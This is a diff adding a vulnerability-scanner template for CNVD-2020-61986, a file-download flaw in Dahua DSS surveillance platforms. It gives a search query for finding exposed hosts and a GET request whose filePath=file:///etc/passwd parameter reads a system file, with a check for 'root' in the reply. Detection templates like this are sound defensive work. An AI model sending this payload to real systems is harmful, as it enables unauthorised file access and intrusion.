@@ -1,0 +1,18 @@
+name: Zhejiang Dahua DSS System Filedownload CNVD-2020-61986
+manual: true
+query: title="DSS-平安城市"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
+    expression: response.status == 200 && response.body.bcontains(b"root")
+expression: r0()
+detail:
+  links:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2020-61986
+  description: 'Zhejiang Dahua DSS (digital surveillance system) is a comprehensive
+    management platform that integrates the management functions of four security
+    subsystems: video, alarm, access control and intercom.'
+  tags: filedownload
